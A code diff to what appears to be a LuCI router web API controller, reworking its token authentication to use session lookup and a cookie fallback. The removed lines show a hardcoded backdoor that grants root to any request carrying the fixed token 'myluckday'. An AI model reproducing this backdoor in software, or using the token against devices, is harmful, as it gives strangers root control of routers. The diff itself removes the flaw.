@@ -11,19 +11,16 @@ local debug = require "luci.api.tools.debug"
 
 function index()
     local function authenticator(validator, accs)
-        local auth = luci.http.formvalue("auth", true)
+        local http = require "luci.http"
+        local ctrl = require "luci.controller.rpc"
+        local auth = http.formvalue("auth", true) or http.getcookie("sysauth")
         if auth then -- if authentication token was given
-            if auth == "myluckday" then
-                    return "root", auth
-            end
-            local sdat = luci.sauth.read(auth)
+            local sid, sdat = ctrl.session_retrieve(auth, accs)
             if sdat then -- if given token is valid
-                if sdat.user and luci.util.contains(accs, sdat.user) then
-                    return sdat.user, auth
-                end
+                return sdat.username, sid
             end
+            http.status(403, "Forbidden")
         end
-        luci.http.status(403, "Forbidden")
     end
 
     local api = node("api")
